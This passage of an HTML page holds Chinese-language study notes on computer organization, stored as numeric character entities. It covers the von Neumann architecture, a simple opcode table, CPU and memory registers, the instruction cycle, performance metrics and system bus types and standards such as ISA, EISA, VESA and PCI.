73B0;&#x4E58;&#x6CD5;&#x6307;&#x4EE4;</td><td>&#x5B9E;&#x73B0;&#x8BA1;&#x7B97;&#x673A;&#x4F53;&#x7CFB;&#x7ED3;&#x6784;&#x6240;&#x4F53;&#x73B0;&#x7684;&#x5C5E;&#x6027;&#xFF08;&#x5177;&#x4F53;&#x6307;&#x4EE4;&#x7684;&#x5B9E;&#x73B0;&#xFF09;</td></tr></tbody></table><p>&#x51AF;.&#x8BFA;&#x4F9D;&#x66FC;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x7279;&#x70B9;</p><ol><li>&#x8BA1;&#x7B97;&#x673A;&#x7531;&#x8FD0;&#x7B97;&#x5668;&#xFF0C;&#x5B58;&#x50A8;&#x5668;&#xFF0C;&#x63A7;&#x5236;&#x5668;&#xFF0C;&#x8F93;&#x5165;&#x8BBE;&#x5907;&#x548C;&#x8F93;&#x51FA;&#x8BBE;&#x5907;&#x4E94;&#x5927;&#x90E8;&#x5206;&#x7EC4;&#x6210;</li><li>&#x6307;&#x4EE4;&#x548C;&#x6570;&#x636E;&#x4EE5;&#x540C;&#x7B49;&#x5730;&#x4F4D;&#x5B58;&#x653E;&#x4E0E;&#x5B58;&#x50A8;&#x5668;&#x5185;&#xFF0C;&#x5E76;&#x53EF;&#x6309;&#x5730;&#x5740;&#x5BFB;&#x8BBF;</li><li>&#x6307;&#x4EE4;&#x548C;&#x6570;&#x636E;&#x7528;&#x4E8C;&#x8FDB;&#x5236;&#x8868;&#x793A;</li><li>&#x6307;&#x4EE4;&#x7531;&#x64CD;&#x4F5C;&#x7801;&#x548C;&#x5730;&#x5740;&#x7801;&#x7EC4;&#x6210;</li><li>&#x5B58;&#x50A8;&#x7A0B;&#x5E8F;</li><li>&#x4EE5;&#x8FD0;&#x7B97;&#x5668;&#x4E3A;&#x4E2D;&#x5FC3;</li></ol><p>&#x51AF;.&#x8BFA;&#x4F9D;&#x66FC;&#x8BA1;&#x7B97;&#x673A;&#x786C;&#x4EF6;&#x6846;&#x56FE;</p><p>&#x73B0;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#x786C;&#x4EF6;&#x6846;&#x56FE;</p><p>&#x8BBE;&#x67D0;&#x673A;&#x7684;&#x6307;&#x4EE4;&#x5B57;&#x957F;&#x4E3A;16&#x4F4D;&#xFF0C;&#x5176;&#x4E2D;&#x64CD;&#x4F5C;&#x7801;&#x5360;6&#x4F4D;&#xFF0C;&#x5730;&#x5740;&#x7801;&#x5360;10&#x4F4D;&#x3002;</p><table><thead><tr><th>&#x64CD;&#x4F5C;&#x7801;</th><th>&#x64CD;&#x4F5C;&#x6027;&#x8D28;</th><th>&#x5177;&#x4F53;&#x5185;&#x5BB9;</th></tr></thead><tbody><tr><td>000001</td><td>&#x53D6;&#x6570;</td><td>&#x5C06;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x7801;&#x6307;&#x793A;&#x7684;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2D;&#x7684;&#x64CD;&#x4F5C;&#x6570;&#x53D6;&#x5230;&#x8FD0;&#x7B97;&#x5668;&#x7684;&#x7D2F;&#x52A0;&#x5668;ACC&#x4E2D;</td></tr><tr><td>000010</td><td>&#x5B58;&#x6570;</td><td>&#x5C06;ACC&#x4E2D;&#x7684;&#x6570;&#x5B58;&#x81F3;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x7801;&#x6307;&#x793A;&#x7684;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2D;</td></tr><tr><td>000011</td><td>&#x52A0;</td><td>&#x5C06;ACC&#x4E2D;&#x7684;&#x6570;&#x4E0E;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x7801;&#x6307;&#x793A;&#x7684;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2D;&#x7684;&#x6570;&#x76F8;&#x52A0;&#xFF0C;&#x7ED3;&#x679C;&#x5B58;&#x4E8E;ACC&#x4E2D;</td></tr><tr><td>000100</td><td>&#x4E58;</td><td>&#x5C06;ACC&#x4E2D;&#x7684;&#x6570;&#x4E0E;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x7801;&#x6307;&#x793A;&#x7684;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2D;&#x7684;&#x6570;&#x76F8;&#x4E58;&#xFF0C;&#x7ED3;&#x679C;&#x5B58;&#x4E8E;ACC&#x4E2D;</td></tr><tr><td>000101</td><td>&#x6253;&#x5370;</td><td>&#x5C06;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x7801;&#x6307;&#x793A;&#x7684;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2D;&#x64CD;&#x4F5C;&#x6570;&#x6253;&#x5370;&#x8F93;&#x51FA;</td></tr></tbody></table><p>&#x5B58;&#x50A8;&#x5668;&#x7684;&#x57FA;&#x672C;&#x7EC4;&#x6210;</p><table><thead><tr><th>&#x7EC4;&#x6210;</th><th>&#x89E3;&#x91CA;</th></tr></thead><tbody><tr><td>&#x5B58;&#x50A8;&#x5355;&#x5143;</td><td>&#x5B58;&#x653E;&#x4E00;&#x4E32;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801;</td></tr><tr><td>&#x5B58;&#x50A8;&#x5B57;</td><td>&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2D;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801;&#x7684;&#x7EC4;&#x5408;</td></tr><tr><td>&#x5B58;&#x50A8;&#x5B57;&#x957F;</td><td>&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2D;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801;&#x7684;&#x4F4D;&#x6570;&#x6BCF;&#x4E2A;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x8D4B;&#x4E88;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x53F7;</td></tr><tr><td>MAR</td><td>&#x5B58;&#x50A8;&#x5668;&#x5730;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x53CD;&#x6620;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x7684;&#x4E2A;&#x6570; 2**n</td></tr><tr><td>MDR</td><td>&#x5B58;&#x50A8;&#x5668;&#x6570;&#x636E;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x53CD;&#x6620;&#x5B58;&#x50A8;&#x5B57;&#x957F; n</td></tr></tbody></table><p>&#x8FD0;&#x7B97;&#x5668;&#x57FA;&#x672C;&#x7EC4;&#x6210;</p><table><thead><tr><th>&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x64CD;&#x4F5C;&#x6570;&#xFF0C;&#x8FD0;&#x7B97;</th><th>&#x52A0;&#x6CD5;</th><th>&#x51CF;&#x6CD5;</th><th>&#x4E58;&#x6CD5;</th><th>&#x9664;&#x6CD5;</th></tr></thead><tbody><tr><td>ACC</td><td>&#x88AB;&#x52A0;&#x6570;&#x53CA;&#x548C;</td><td>&#x88AB;&#x51CF;&#x6570;&#x53CA;&#x5DEE;</td><td>&#x4E58;&#x79EF;&#x9AD8;&#x4F4D;</td><td>&#x88AB;&#x9664;&#x6570;&#x53CA;&#x4F59;&#x6570;</td></tr><tr><td>MQ</td><td></td><td></td><td>&#x4E58;&#x6570;&#x53CA;&#x4E58;&#x79EF;&#x4F4E;&#x4F4D;</td><td>&#x5546;</td></tr><tr><td>X</td><td>&#x52A0;&#x6570;</td><td>&#x51CF;&#x6570;</td><td>&#x88AB;&#x4E58;&#x6570;</td><td>&#x9664;&#x6570;</td></tr></tbody></table><p>&#x63A7;&#x5236;&#x5668;&#x7684;&#x57FA;&#x672C;&#x7EC4;&#x6210;</p><p>| &#x7B80;&#x79F0; | &#x610F;&#x4E49; | &#x4F5C;&#x7528; | &#x89E3;&#x91CA; |<br>| PC | &#x53D6;&#x6307;&#x4EE4; | &#x53D6;&#x6307;&#xFF0C;&#x8BBF;&#x5B58; | &#x5B58;&#x653E;&#x5F53;&#x524D;&#x6B32;&#x6267;&#x884C;&#x6307;&#x4EE4;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x5177;&#x6709;&#x8BA1;&#x6570;&#x529F;&#x80FD;(PC)+1-&gt;pc |<br>| IR | &#x5206;&#x6790;&#x6307;&#x4EE4; | &#x53D6;&#x6307;&#xFF0C;&#x8BBF;&#x5B58; | &#x5B58;&#x653E;&#x5F53;&#x524D;&#x6B32;&#x6267;&#x884C;&#x7684;&#x6307;&#x4EE4; |<br>| CU | &#x6267;&#x884C;&#x6307;&#x4EE4; | &#x6267;&#x884C;&#xFF0C;&#x8BBF;&#x5B58; | &#x63A7;&#x5236;&#x5355;&#x5143; |</p><p>&#x4EE5;&#x53D6;&#x6570;&#x6307;&#x4EE4;&#x4E3A;&#x4F8B;</p><p>&#x7A0B;&#x5E8F;&#x9996;&#x5730;&#x5740;PC<br>&#x53D6;&#x6307;&#x4EE4;&#xFF1A;PC-&gt;MAR-&gt;&#x5B58;&#x50A8;&#x4F53;M-MDR-&gt;IR<br>&#x5206;&#x6790;&#x6307;&#x4EE4;&#xFF1A;IR-&gt;CU<br>&#x6267;&#x884C;&#x6307;&#x4EE4;&#xFF1A;IR-&gt;MAR-&gt;M-&gt;MDR-&gt;ACC</p><p>&#x8BA1;&#x7B97;&#x673A;&#x786C;&#x4EF6;&#x7684;&#x4E3B;&#x8981;&#x6280;&#x672F;&#x6307;&#x6807;</p><p>&#x673A;&#x5668;&#x5B57;&#x957F;&#xFF1A;CPU&#x4E00;&#x6B21;&#x80FD;&#x5904;&#x7406;&#x6570;&#x636E;&#x7684;&#x4F4D;&#x6570;&#xFF0C;&#x4E0E;CPU&#x4E2D;&#x7684;&#x5BC4;&#x5B58;&#x5668;&#x4F4D;&#x6570;&#x6709;&#x5173;&#x3002;</p><p>&#x8FD0;&#x7B97;&#x901F;&#x5EA6;&#xFF1A;&#x4E3B;&#x9891;&#xFF0C;&#x5409;&#x666E;&#x68EE;&#x6CD5;(&#x6BCF;&#x6761;&#x6307;&#x4EE4;&#x7684;&#x6267;&#x884C;&#x7684;&#x65F6;&#x95F4;&#x4EE5;&#x53CA;&#x4ED6;&#x4EEC;&#x5728;&#x5168;&#x90E8;&#x64CD;&#x4F5C;&#x4E2D;&#x6240;&#x5360;&#x7684;&#x767E;&#x5206;&#x6BD4;TM=&#x2211;ni=1fitiTM=&#x2211;i=1nfiti)&#xFF0C;MIPS(&#x767E;&#x4E07;&#x6761;&#x6307;&#x4EE4;&#x6BCF;&#x79D2;),CPI(&#x6267;&#x884C;&#x4E00;&#x6761;&#x6307;&#x4EE4;&#x6240;&#x9700;&#x65F6;&#x949F;&#x5468;&#x671F;&#x6570;)&#xFF0C;FLOPS(&#x6BCF;&#x79D2;&#x6D6E;&#x70B9;&#x8FD0;&#x7B97;&#x6B21;&#x6570;)</p><p>&#x5B58;&#x50A8;&#x5BB9;&#x91CF;(&#x5B58;&#x653E;&#x4E8C;&#x8FDB;&#x5236;&#x4FE1;&#x606F;&#x7684;&#x603B;&#x4F4D;&#x6570;)</p><table><thead><tr><th>&#x5206;&#x7C7B;</th><th>&#x7EC4;&#x6210;</th></tr></thead><tbody><tr><td>&#x4E3B;&#x5B58;&#x5BB9;&#x91CF;</td><td>&#x5B58;&#x50A8;&#x5355;&#x5143;&#xD7;&#x5B57;&#x8282;&#x6570;</td></tr><tr><td>&#x4E3B;&#x5B58;&#x5BB9;&#x91CF;</td><td>&#x5B57;&#x8282;&#x6570;</td></tr><tr><td>&#x8F85;&#x5B58;&#x5BB9;&#x91CF;</td><td>&#x5B57;&#x8282;&#x6570;</td></tr></tbody></table><p>&#x6307;&#x4EE4;&#x548C;&#x6570;&#x636E;&#x90FD;&#x5B58;&#x4E8E;&#x5B58;&#x50A8;&#x5668;&#x4E2D;&#xFF0C;&#x8BA1;&#x7B97;&#x673A;&#x5982;&#x4F55;&#x533A;&#x5206;&#x5B83;&#x4EEC;&#xFF1F;<br>1.&#x901A;&#x8FC7;&#x4E0D;&#x540C;&#x7684;&#x65F6;&#x95F4;&#x6BB5;&#xFF0C;&#x5728;&#x53D6;&#x6307;&#x4EE4;&#x9636;&#x6BB5;&#x53D6;&#x51FA;&#x7684;&#x4E3A;&#x6307;&#x4EE4;&#xFF0C;&#x5728;&#x6267;&#x884C;&#x6307;&#x4EE4;&#x9636;&#x6BB5;&#x53D6;&#x51FA;&#x4E3A;&#x6570;&#x636E;<br>2.&#x901A;&#x8FC7;&#x5730;&#x5740;&#x6E90;&#xFF1A;&#x7531;PC&#x63D0;&#x4F9B;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x5730;&#x5740;&#x7684;&#x53D6;&#x51FA;&#x7684;&#x662F;&#x6307;&#x4EE4;&#xFF0C;&#x7531;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x7801;&#x63D0;&#x4F9B;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x5730;&#x5740;&#x53D6;&#x51FA;&#x7684;&#x662F;&#x64CD;&#x4F5C;&#x6570;&#x3002;</p><p>&#x4E8C;  &#x8BA1;&#x7B97;&#x673A;&#x7684;&#x53D1;&#x5C55;&#x53CA;&#x5E94;&#x7528;</p><p>Moore&#xFF08;&#x6469;&#x5C14;&#xFF09;&#x5B9A;&#x5F8B;&#xFF1A;&#x5FAE;&#x82AF;&#x4E0A;&#x96C6;&#x6210;&#x7684;&#x6676;&#x4F53;&#x7BA1;&#x6570;&#x76EE;&#x6BCF;&#x4E09;&#x5E74;&#x7FFB;&#x4E24;&#x756A;</p><p>&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x5E94;&#x7528;</p><p>&#x4E00;&#x3001;&#x79D1;&#x5B66;&#x8BA1;&#x7B97;&#x548C;&#x6570;&#x636E;&#x5904;&#x7406;</p><p>&#x4E8C;&#x3001;&#x5DE5;&#x4E1A;&#x63A7;&#x5236;&#x548C;&#x5B9E;&#x65F6;&#x63A7;&#x5236;</p><p>&#x4E09;&#x3001;&#x7F51;&#x7EDC;&#x6280;&#x672F;</p><ol><li><p>&#x7535;&#x5B50;&#x5546;&#x52A1;</p></li><li><p>&#x7F51;&#x7EDC;&#x6559;&#x80B2;</p></li><li><p>&#x654F;&#x6377;&#x5236;&#x9020;</p></li></ol><p>&#x56DB;&#x3001;&#x865A;&#x62DF;&#x73B0;&#x5B9E;</p><p>&#x4E94;&#x3001;&#x529E;&#x516C;&#x81EA;&#x52A8;&#x5316;&#x548C;&#x7BA1;&#x7406;&#x4FE1;&#x606F;&#x7CFB;&#x7EDF;</p><p>&#x516D;&#x3001;CAD/CAM/CIMS</p><p>&#x4E03;&#x3001;&#x591A;&#x5A92;&#x4F53;&#x6280;&#x672F;</p><p>&#x516B;&#x3001;&#x4EBA;&#x5DE5;&#x667A;&#x80FD;</p><p>&#x82AF;&#x7247;&#x96C6;&#x6210;&#x5EA6;&#x7684;&#x63D0;&#x9AD8;&#x53D7;&#x4EE5;&#x4E0B;&#x4E09;&#x65B9;&#x9762;&#x7684;&#x9650;&#x5236;</p><p>&#x82AF;&#x7247;&#x96C6;&#x6210;&#x5EA6;&#x53D7;&#x7269;&#x7406;&#x6781;&#x9650;&#x7684;&#x5236;&#x7EA6;</p><p>&#x6309;&#x51E0;&#x4F55;&#x7EA7;&#x6570;&#x9012;&#x589E;&#x7684;&#x5236;&#x4F5C;&#x6210;&#x672C;</p><p>&#x82AF;&#x7247;&#x7684;&#x529F;&#x8017;&#x3001;&#x6563;&#x70ED;&#x3001;&#x7EBF;&#x5EF6;&#x8FDF;</p><table><thead><tr><th>&#x8BA1;&#x7B97;&#x673A;</th><th>&#x4EE3;&#x66FF;&#x90E8;&#x5206;</th></tr></thead><tbody><tr><td>&#x5149;&#x8BA1;&#x7B97;&#x673A;</td><td>&#x5229;&#x7528;&#x5149;&#x5B50;&#x53D6;&#x4EE3;&#x7535;&#x5B50;&#x8FDB;&#x884C;&#x8FD0;&#x7B97;&#x548C;&#x5B58;&#x50A8;</td></tr><tr><td>DNA&#x751F;&#x7269;&#x8BA1;&#x7B97;&#x673A;</td><td>&#x901A;&#x8FC7;&#x63A7;&#x5236;DNA&#x5206;&#x5B50;&#x95F4;&#x7684;&#x751F;&#x5316;&#x53CD;&#x5E94;</td></tr><tr><td>&#x91CF;&#x5B50;&#x8BA1;&#x7B97;&#x673A;</td><td>&#x5229;&#x7528;&#x539F;&#x5B50;&#x6240;&#x5177;&#x6709;&#x7684;&#x91CF;&#x5B50;&#x7279;&#x6027;</td></tr></tbody></table><p>&#x4E09;  &#x7CFB;&#x7EDF;&#x603B;&#x7EBF;</p><p>&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x4E94;&#x5927;&#x90E8;&#x4EF6;&#x4E4B;&#x95F4;&#x7684;&#x4E92;&#x8FDE;&#x7684;&#x65B9;&#x5F0F;&#x6709;&#x4E24;&#x79CD;</p><ol><li>&#x5206;&#x6563;&#x8FDE;&#x63A5;&#xFF1A;&#x5404;&#x90E8;&#x4EF6;&#x4E4B;&#x95F4;&#x4F7F;&#x7528;&#x5355;&#x72EC;&#x7684;&#x8FDE;&#x7EBF;</li><li>&#x603B;&#x7EBF;&#x8FDE;&#x63A5;&#xFF1A;&#x5C06;&#x5404;&#x90E8;&#x4EF6;&#x8FDE;&#x5230;&#x4E00;&#x7EC4;&#x516C;&#x5171;&#x4FE1;&#x606F;&#x4F20;&#x8F93;&#x7EBF;&#x4E0A;</li></ol><p>&#x603B;&#x7EBF;&#xFF1A;&#x8FDE;&#x63A5;&#x5404;&#x4E2A;&#x90E8;&#x4EF6;&#x7684;&#x4FE1;&#x606F;&#x4F20;&#x8F93;&#x7EBF;&#xFF0C;&#x662F;&#x5404;&#x4E2A;&#x90E8;&#x4EF6;&#x5171;&#x4EAB;&#x7684;&#x4F20;&#x8F93;&#x4ECB;&#x8D28;</p><p>&#x603B;&#x7EBF;&#x4F20;&#x8F93;&#x7279;&#x70B9;&#xFF1A;&#x67D0;&#x4E00;&#x65F6;&#x523B;&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x8DEF;&#x4FE1;&#x606F;&#x5728;&#x603B;&#x7EBF;&#x4E0A;&#x4F20;&#x8F93;&#xFF0C;&#x5373;&#x5206;&#x65F6;&#x4F7F;&#x7528;&#x3002;&#x4E3A;&#x4E86;&#x51CF;&#x8F7B;&#x603B;&#x7EBF;&#x8D1F;&#x8F7D;&#xFF0C;&#x603B;&#x7EBF;&#x4E0A;&#x7684;&#x90E8;&#x4EF6;&#x5E94;&#x901A;&#x8FC7;&#x4E09;&#x6001;&#x9A71;&#x52A8;&#x7F13;&#x51B2;&#x7535;&#x8DEF;&#x4E0E;&#x603B;&#x7EBF;&#x76F8;&#x8FDE;</p><p>&#x603B;&#x7EBF;&#x4E0A;&#x4FE1;&#x606F;&#x7684;&#x4F20;&#x8F93;&#xFF1A;</p><p>&#x4E32;&#x884C;&#xFF1A;&#x6BCF;&#x6761;&#x7EBF;&#x53EF;&#x4E00;&#x4F4D;&#x4E00;&#x4F4D;&#x7684;&#x4F20;&#x8F93;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801;&#xFF0C;&#x4E00;&#x4E32;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801;&#x53EF;&#x5728;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x5185;&#x9010;&#x4E00;&#x4F20;&#x8F93;&#x5B8C;&#x6210;</p><p>&#x5E76;&#x884C;&#xFF1A;&#x82E5;&#x5E72;&#x6761;&#x4F20;&#x8F93;&#x7EBF;&#x540C;&#x65F6;&#x4F20;&#x8F93;&#x82E5;&#x5E72;&#x6761;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801;</p><p>&#x9762;&#x5411; CPU &#x7684;&#x53CC;&#x603B;&#x7EBF;&#x7ED3;&#x6784;&#x6846;&#x56FE;</p><p>&#x5355;&#x603B;&#x7EBF;&#x7ED3;&#x6784;&#x6846;&#x56FE;</p><p>&#x4EE5;&#x5B58;&#x50A8;&#x5668;&#x4E3A;&#x4E2D;&#x5FC3;&#x7684;&#x53CC;&#x603B;&#x7EBF;&#x7ED3;&#x6784;&#x6846;&#x56FE;</p><table><thead><tr><th>&#x603B;&#x7EBF;&#x5206;&#x7C7B;</th><th>&#x89E3;&#x91CA;</th></tr></thead><tbody><tr><td>&#x7247;&#x5185;&#x603B;&#x7EBF;</td><td>&#x82AF;&#x7247;&#x5185;&#x90E8;&#x7684;&#x603B;&#x7EBF;,&#x5982;&#x5BC4;&#x5B58;&#x5668;&#x4E0E;&#x5BC4;&#x5B58;&#x5668;&#x4E4B;&#x95F4;,&#x5BC4;&#x5B58;&#x5668;&#x4E0E;&#x7B97;&#x903B;&#x5355;&#x5143;ALU&#x4E4B;&#x95F4;&#x3002;</td></tr><tr><td>&#x7CFB;&#x7EDF;&#x603B;&#x7EBF;</td><td>&#x8BA1;&#x7B97;&#x673A;&#x5404;&#x90E8;&#x4EF6;&#x4E4B;&#x95F4;&#x7684;&#x4FE1;&#x606F;&#x4F20;&#x8F93;&#x7EBF;(CPU,&#x4E3B;&#x5B58;,I/O&#x8BBE;&#x5907;&#x7B49;)</td></tr><tr><td>&#x7CFB;&#x7EDF;&#x603B;&#x7EBF;-&#x6570;&#x636E;&#x603B;&#x7EBF;</td><td>&#x53CC;&#x5411;&#x4F20;&#x8F93;,&#x5176;&#x4F4D;&#x6570;&#x4E0E;&#x673A;&#x5668;&#x5B57;&#x957F;,&#x5B58;&#x50A8;&#x5B57;&#x957F;&#x6709;&#x5173;</td></tr><tr><td>&#x7CFB;&#x7EDF;&#x603B;&#x7EBF;-&#x5730;&#x5740;&#x603B;&#x7EBF;</td><td>&#x5355;&#x5411;&#xFF0C;&#x4E0E;&#x5B58;&#x50A8;&#x5730;&#x5740;,I/O&#x5730;&#x5740;&#x6709;&#x5173;</td></tr><tr><td>&#x7CFB;&#x7EDF;&#x603B;&#x7EBF;-&#x63A7;&#x5236;&#x603B;&#x7EBF;</td><td>&#x5355;&#x5411;&#xFF0C;&#x53D1;&#x51FA;&#x5404;&#x79CD;&#x63A7;&#x5236;&#x4FE1;&#x53F7;&#x3002;&#x6709;&#x51FA;(&#x5B58;&#x50A8;&#x5668;&#x8BFB;&#x3001;&#x5B58;&#x50A8;&#x5668;&#x5199;&#x603B;&#x7EBF;&#x5141;&#x8BB8;&#x3001;&#x4E2D;&#x65AD;&#x786E;&#x8BA4;),&#x6709;&#x5165;(&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x3001;&#x603B;&#x7EBF;&#x8BF7;&#x6C42;)</td></tr><tr><td>&#x901A;&#x4FE1;&#x603B;&#x7EBF;</td><td>&#x7528;&#x4E8E;&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x4E4B;&#x95F4;&#x6216;&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x4E0E;&#x5176;&#x4ED6;&#x7CFB;&#x7EDF;&#xFF08;&#x5982;&#x63A7;&#x5236;&#x4EEA;&#x8868;&#x3001;&#x79FB;&#x52A8;&#x901A;&#x4FE1;&#x7B49;&#xFF09;&#x4E4B;&#x95F4;&#x7684;&#x901A;&#x4FE1;&#x3002;&#x5206;&#x4E3A;&#x4E32;&#x884C;&#x901A;&#x4FE1;&#x548C;&#x5E76;&#x884C;&#x901A;&#x4FE1;</td></tr></tbody></table><p>&#x603B;&#x7EBF;&#x7269;&#x7406;&#x5B9E;&#x73B0;</p><p>&#x603B;&#x7EBF;&#x7279;&#x6027;</p><table><thead><tr><th>&#x603B;&#x7EBF;&#x7279;&#x6027;</th><th></th></tr></thead><tbody><tr><td>&#x673A;&#x68B0;&#x7279;&#x6027;</td><td>&#x6307;&#x603B;&#x7EBF;&#x5728;&#x673A;&#x68B0;&#x8FDE;&#x63A5;&#x65B9;&#x5F0F;&#x4E0A;&#x7684;&#x4E00;&#x4E9B;&#x6027;&#x80FD;&#xFF0C;&#x5C3A;&#x5BF8;&#xFF0C;&#x5F62;&#x72B6;&#xFF0C;&#x5F15;&#x811A;&#x7684;&#x4E2A;&#x6570;&#x4EE5;&#x53CA;&#x6392;&#x5217;&#x7684;&#x987A;&#x5E8F;&#xFF0C;&#x63A5;&#x5934;&#x5904;&#x7684;&#x53EF;&#x9760;&#x63A5;&#x89E6;</td></tr><tr><td>&#x7535;&#x6C14;&#x7279;&#x6027;</td><td>&#x603B;&#x7EBF;&#x7684;&#x6BCF;&#x4E00;&#x6839;&#x4F20;&#x8F93;&#x7EBF;&#x4E0A;&#x4FE1;&#x53F7;&#x7684;&#x4F20;&#x8F93;&#x65B9;&#x5411;&#x548C;&#x6709;&#x6548;&#x7684;&#x7535;&#x5E73;&#x8303;&#x56F4;</td></tr><tr><td>&#x529F;&#x80FD;&#x7279;&#x6027;</td><td>&#x6BCF;&#x6839;&#x4F20;&#x8F93;&#x7EBF;&#x7684;&#x529F;&#x80FD;&#x3002;&#x5730;&#x5740;&#x603B;&#x7EBF;&#x7528;&#x6765;&#x6307;&#x51FA;&#x5730;&#x5740;&#x7801;&#xFF1B;&#x6570;&#x636E;&#x603B;&#x7EBF;&#x4F20;&#x9012;&#x6570;&#x636E;&#xFF1B;&#x63A7;&#x5236;&#x603B;&#x7EBF;&#x53D1;&#x51FA;&#x63A7;&#x5236;&#x4FE1;&#x53F7;</td></tr><tr><td>&#x65F6;&#x95F4;&#x7279;&#x6027;</td><td>&#x4FE1;&#x53F7;&#x7684;&#x65F6;&#x5E8F;&#x5173;&#x7CFB;</td></tr></tbody></table><p>&#x603B;&#x7EBF;&#x6027;&#x80FD;&#x6307;&#x6807;</p><table><thead><tr><th>&#x6027;&#x80FD;</th><th>&#x6307;&#x6807;</th></tr></thead><tbody><tr><td>&#x603B;&#x7EBF;&#x5BBD;&#x5EA6;</td><td>&#x6570;&#x636E;&#x7EBF;&#x5206;&#x6839;&#x6570;&#xFF0C;&#x7528;bit</td></tr><tr><td>&#x603B;&#x7EBF;&#x5E26;&#x5BBD;</td><td>&#x6BCF;&#x79D2;&#x4F20;&#x8F93;&#x7684;&#x6700;&#x5927;&#x5B57;&#x8282;&#x6570;(MBps)</td></tr><tr><td>&#x65F6;&#x949F;&#x540C;&#x6B65;/&#x5F02;&#x6B65;</td><td>&#x540C;&#x6B65;&#xFF0C;&#x5F02;&#x6B65;</td></tr><tr><td>&#x603B;&#x7EBF;&#x590D;&#x7528;</td><td>&#x5730;&#x5740;&#x7EBF;&#x4E0E;&#x6570;&#x636E;&#x7EBF;&#x590D;&#x7528;</td></tr><tr><td>&#x4FE1;&#x53F7;&#x7EBF;&#x6570;</td><td>&#x5730;&#x5740;&#x7EBF;&#xFF0C;&#x6570;&#x636E;&#x7EBF;&#x548C;&#x63A7;&#x5236;&#x7EBF;&#x7684;&#x603B;&#x548C;</td></tr><tr><td>&#x603B;&#x7EBF;&#x63A7;&#x5236;&#x65B9;&#x5F0F;</td><td>&#x7A81;&#x53D1;&#xFF0C;&#x81EA;&#x52A8;&#xFF0C;&#x4EF2;&#x88C1;&#xFF0C;&#x903B;&#x8F91;&#xFF0C;&#x8BA1;&#x6570;</td></tr><tr><td>&#x5176;&#x4ED6;&#x6307;&#x6807;</td><td>&#x8D1F;&#x8F7D;&#x80FD;&#x529B;&#xFF08;&#x9A71;&#x52A8;&#x80FD;&#x529B;&#xFF09;&#xFF0C;&#x7535;&#x6E90;&#x7535;&#x538B;&#xFF0C;&#x603B;&#x7EBF;&#x5BBD;&#x5EA6;&#x80FD;&#x5426;&#x6269;&#x5C55;&#x7B49;</td></tr></tbody></table><p>&#x603B;&#x7EBF;&#x6807;&#x51C6;</p><p>&#x603B;&#x7EBF;&#x6807;&#x51C6;&#xFF1A;&#x7CFB;&#x7EDF;&#x4E0E;&#x5404;&#x6A21;&#x5757;&#xFF0C;&#x6A21;&#x5757;&#x4E0E;&#x6A21;&#x5757;&#x4E4B;&#x95F4;&#x7684;&#x4E00;&#x4E2A;&#x4E92;&#x8FDE;&#x7684;&#x6807;&#x51C6;&#x754C;&#x9762;</p><p>&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x8BBE;&#x7ACB;&#x603B;&#x7EBF;&#x6807;&#x51C6;&#xFF1A;&#x4E3A;&#x4E86;&#x4F7F;&#x8BBE;&#x8BA1;&#x7B80;&#x5316;&#xFF0C;&#x6A21;&#x5757;&#x751F;&#x4EA7;&#x6279;&#x91CF;&#x5316;&#xFF0C;&#x786E;&#x4FDD;&#x5176;&#x6027;&#x80FD;&#x7A33;&#x5B9A;&#xFF0C;&#x8D28;&#x91CF;&#x53EF;&#x9760;&#xFF0C;&#x5B9E;&#x73B0;&#x53EF;&#x79FB;&#x5316;&#xFF0C;&#x4FBF;&#x4E8E;&#x7EF4;&#x62A4;&#x3002;</p><table><thead><tr><th>&#x603B;&#x7EBF;&#x6807;&#x51C6;</th><th>&#x6570;&#x636E;&#x7EBF;</th><th>&#x5730;&#x5740;&#x7EBF;</th><th>&#x603B;&#x7EBF;&#x65F6;&#x949F;</th><th>&#x5E26;&#x5BBD;</th><th>&#x7279;&#x6027;</th></tr></thead><tbody><tr><td>ISA</td><td>16</td><td>24</td><td>8MHz(&#x72EC;&#x7ACB;)</td><td>16MBps</td><td></td></tr><tr><td>EISA</td><td>32</td><td>32</td><td>8MHz(&#x72EC;&#x7ACB;)</td><td>33MBps</td><td></td></tr><tr><td>VESA(VL-BUS)</td><td>32</td><td></td><td>33MHz(CPU)</td><td>133MBps</td><td></td></tr><tr><td>PCI</td><td>32 